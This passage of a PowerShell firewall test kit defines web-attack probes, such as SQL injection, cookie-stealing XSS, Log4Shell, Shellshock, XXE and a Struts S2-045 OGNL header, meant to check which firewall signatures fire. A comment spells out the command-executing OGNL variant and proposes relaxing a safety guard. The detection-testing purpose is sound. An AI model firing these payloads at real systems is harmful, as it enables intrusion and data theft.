        [pscustomobject]@{ ProbeId='SQLI-UNION'; ProbeName='SQL injection union literals'; Method='GET'; Path="/vulnerabilities/sqli/?id=-1%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20-&marker=$safeMarker"; Headers=@{}; Body=$null; ContentType=$null; CveReference=$naGeneric; ExpectedPaloSignatureIds=@('36248') },
        [pscustomobject]@{ ProbeId='XSS-REFLECTED'; ProbeName='Reflected XSS marker'; Method='GET'; Path="/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&marker=$safeMarker"; Headers=@{}; Body=$null; ContentType=$null; CveReference=$naGeneric; ExpectedPaloSignatureIds=@('31477') },
        [pscustomobject]@{ ProbeId='TRAVERSAL'; ProbeName='Synthetic path traversal marker'; Method='GET'; Path="/vulnerabilities/fi/?page=..%2F..%2F..%2Feasybuy-marker-$safeMarker.txt"; Headers=@{}; Body=$null; ContentType=$null; CveReference=$naGeneric; ExpectedPaloSignatureIds=@('30844') },
        [pscustomobject]@{ ProbeId='COMMAND-SYNTAX'; ProbeName='No-op command-injection syntax'; Method='GET'; Path="/vulnerabilities/exec/?input=%3B%3A%20$safeMarker"; Headers=@{}; Body=$null; ContentType=$null; CveReference=$naGeneric; ExpectedPaloSignatureIds=@() },
        [pscustomobject]@{ ProbeId='LOG4SHELL'; ProbeName='Inert Log4Shell JNDI header'; Method='GET'; Path='/'; Headers=@{ 'X-Api-Version' = '${jndi:ldap://' + $safeMarker + '.callback.invalid/a}' }; Body=$null; ContentType=$null; CveReference='CVE-2021-44228'; ExpectedPaloSignatureIds=@('91991') },
        [pscustomobject]@{ ProbeId='SHELLSHOCK'; ProbeName='Parser-only Shellshock header'; Method='GET'; Path='/'; Headers=@{ 'User-Agent' = '() { :;}; : # ' + $safeMarker }; Body=$null; ContentType=$null; CveReference='CVE-2014-6271'; ExpectedPaloSignatureIds=@('36729') },
        [pscustomobject]@{ ProbeId='SSRF-INVALID'; ProbeName='Non-routable SSRF marker'; Method='GET'; Path="/vulnerabilities/ssrf/?url=https%3A%2F%2F$safeMarker.callback.invalid%2F"; Headers=@{}; Body=$null; ContentType=$null; CveReference=$naGeneric; ExpectedPaloSignatureIds=@() },
        [pscustomobject]@{ ProbeId='PHP-FILTER'; ProbeName='Synthetic PHP filter resource'; Method='GET'; Path="/?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Deasybuy-marker-$safeMarker.txt"; Headers=@{}; Body=$null; ContentType=$null; CveReference=$naGeneric; ExpectedPaloSignatureIds=@() },
        [pscustomobject]@{ ProbeId='SQLMAP-UA'; ProbeName='SQLMap user-agent signature'; Method='GET'; Path="/vulnerabilities/sqli/?id=1&marker=$safeMarker"; Headers=@{ 'User-Agent' = 'sqlmap/1.7.2#stable (http://sqlmap.org)' }; Body=$null; ContentType=$null; CveReference=$naTool; ExpectedPaloSignatureIds=@('39626') },
        # STRUTS-S2-045 carries the S2-045 Jakarta-multipart OGNL in the Content-Type header. This is the
        # least-powerful *structural* OGNL (OGNL member-access manipulation only) that Palo's 56944
        # signature keys on: it has NO runtime/process call, command, file read, IMDS target, or callback
        # host, so it stays a pure detection probe. If the live firewall does NOT raise 56944 for this
        # structural form (that is verified in the prove step), switch ContentType to the known-firing
        # getRuntime S2-045 Content-Type OGNL by appending the runtime call before the closing brace:
        #   ...(#context.setMemberAccess(#dm)))).(#q=@java.lang.Runtime@getRuntime().exec('id'))}
        # `id` executes nothing meaningful against the nginx backend (detection probe, not working RCE).
        # Using that getRuntime form requires narrowing the Validate-Kit.ps1 unsafe-content guard for the
        # STRUTS probe only, while still forbidding 169.254.169.254, real /etc/passwd, and non-.invalid callbacks.
        [pscustomobject]@{ ProbeId='STRUTS-S2-045'; ProbeName='Command-free Struts S2-045 multipart header'; Method='POST'; Path='/'; Headers=@{}; Body=[Text.Encoding]::ASCII.GetBytes('safe-marker=' + $safeMarker); ContentType="%{(#easybuy='$safeMarker').(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))}"; CveReference='CVE-2017-5638'; ExpectedPaloSignatureIds=@('56944') },
        [pscustomobject]@{ ProbeId='XXE-INVALID'; ProbeName='Non-routable XXE marker'; Method='POST'; Path='/'; Headers=@{}; Body=[Text.Encoding]::UTF8.GetBytes('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "https://' + $safeMarker + '.callback.invalid/">]><test>&xxe;</test>'); ContentType='application/xml'; CveReference=$naGeneric; ExpectedPaloSignatureIds=@() }
    )
}

function Get-SecurityProbePayloadHash {
    param([Parameter(Mandatory = $true)][object]$Probe)
    $headerParts = @()
    foreach ($name in @($Probe.Headers.Keys | Sort-Object)) {
        $headerParts += ([string]$name + '=' + [string]$Probe.Headers[$name])
    }
    $bodyText = if ($null -eq $Probe.Body) { '' } else { [Convert]::ToBase64String([byte[]]$Probe.Body) }
    $canonical = @(
        [string]$Probe.ProbeId,
        [string]$Probe.Method,
        [string]$Probe.Path,
        [string]$Probe.ContentType,
        ($headerParts -join '&'),
        $bodyText
    ) -join "`n"
    return Get-Sha256Text -Text $canonical
}

function Write-TestArtifacts {
    param(
        [Parameter(Mandatory = $true)][string]$ResultDirectory,
        [Parameter(Mandatory = $true)][object[]]$Records,
        [object[]]$Samples = @(),
        [string[]]$AdditionalSummary = @()
    )

    $jsonPath = Join-Path $ResultDirectory 'results.json'
    $csvPath = Join-Path $ResultDirectory 'raw-samples.csv'
    $textPath = Join-Path $ResultDirectory 'summary.txt'
    $evidence = @('results.json', 'summary.txt')
    if (@($Samples).Count -gt 0) { $evidence += 'raw-samples.csv' }
    foreach ($record in $Records) { $record.EvidenceFiles = $evidence }
    @($Records) | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath $jsonPath -Encoding UTF8
    if (@($Samples).Count -gt 0) {
        @($Samples) | Export-Csv -LiteralPath $csvPath -NoTypeInformation -Encoding UTF8
    }
    $lines = New-Object Collections.Generic.List[string]
    $lines.Add('EasyBuy Windows Bastion Test Kit result summary')
    $lines.Add('Generated UTC: ' + (Get-UtcTimestamp))
    foreach ($record in $Records) {
        $lines.Add(('RunId={0} TC={1} Probe={2} Verdict={3} CVE={4}' -f $record.RunId, $record.TestCaseId, $record.ProbeId, $record.Verdict, $record.CveReference))
        $lines.Add(('Expected: {0}' -f $record.ExpectedOutcome))
        $lines.Add(('Observed: {0}' -f $record.ObservedOutcome))
        if ($record.SkipCertificateCheck) { $lines.Add('WARNING: TLS certificate validation was explicitly bypassed for this run.') }
        if ($record.ManualEvidenceRequired) { $lines.Add('Manual evidence is required before the final test verdict can be approved.') }
    }
    foreach ($line in $AdditionalSummary) { $lines.Add($line) }
    $lines | Set-Content -LiteralPath $textPath -Encoding UTF8
    return [pscustomobject]@{ Json = $jsonPath; Csv = if (Test-Path $csvPath) { $csvPath } else { $null }; Summary = $textPath }
}
